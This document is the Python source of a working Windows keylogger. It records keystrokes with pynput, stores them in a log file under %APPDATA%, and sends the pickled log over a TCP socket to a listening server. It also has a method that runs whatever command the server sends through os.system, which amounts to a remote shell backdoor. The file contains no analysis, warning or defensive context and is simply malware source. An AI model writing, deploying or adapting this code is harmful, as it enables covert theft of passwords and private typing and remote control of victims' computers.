from pynput.keyboard import Listener
from os import system, getenv, getlogin, remove, path
import socket
from pickle import dumps
Header = 10

class Global:
    key_array = []
    i = 0


class Logging:

    def __init__(self, name_of_file):
        self.path = getenv("appdata") + "\\" + name_of_file

    def return_log(self, only_check=False, return_as_array=False):
        # Method to check whether log file is created and to return its content
        try:
            if only_check:
                if path.exists(self.path):
                    return True
                else:
                    return False
            else:
                x = open(self.path, "r")
                log_content = x.read()
                x.close()
        except(FileNotFoundError, PermissionError):
            return None

        if return_as_array:
            temp_array = []
            for char in log_content:
                temp_array.append(char)
            return temp_array
        return log_content

    def save_log(self, data):
        # Method to save log
        try:
            # create file if not present
            x = open(self.path, "a+")
            for char in data:
                x.write(char)
            x.close()
        except (PermissionError, FileNotFoundError):
            return False
        return True

    def empty_log(self, rm_file=False):
        # Method to delete file content or the entire file
        try:
            if rm_file:
                remove(self.path)
            else:
                x = open(self.path, "w")
                x.close()
        except(FileNotFoundError, PermissionError):
            return False
        return True


class Socket:

    established = False
    cmd_received = False

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.settimeout(1)
            self.active_socket.connect((socket.gethostname(), 50000))
            Socket.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(64)
            cmd = cmd.decode()
            system(cmd)
        except socket.timeout:
            print("timeout")
            Socket.cmd_received = False

    def send_array(self, array):
        if Socket.established:
            array = dumps(array)
            array = bytes(f"{len(array):{Header}}", "utf-8") + array
            try:
                self.active_socket.send(array)
                Socket.established = True
            except(ConnectionResetError, ConnectionAbortedError, OSError):
                Socket.established = False


def key_press(key):
    print("Running listener")
    key = str(key).replace("'", "")
    Global.key_array.append(key)
    Global.i += 1
    if Global.i == 40:
        Global.i = 0
        return False

def main():
    connection = Socket()
    log_file = Logging("log.txt")
    while True:
        # Try to establish connection to server
        if not connection.established:
            connection.connect_to_server()

        # start key listener
        with Listener(on_press=key_press)as f:
            f.join()

        if connection.established:
            # if log could not be saved continue
            x = log_file.save_log(Global.key_array)
            if not x:
                continue
            # Empty temporary array
            Global.key_array = []
            # Read log_file content
            log = log_file.return_log(return_as_array=True)
            if not log:
                continue
            # Send array to server
            connection.send_array(log)

            # If send successfully empty log_file
            if connection.established:
                log_file.empty_log()

        else:
            x = log_file.save_log(Global.key_array)
            if not x:
                continue
            # Empty temporary array
            Global.key_array = []

if __name__ == '__main__':
    main()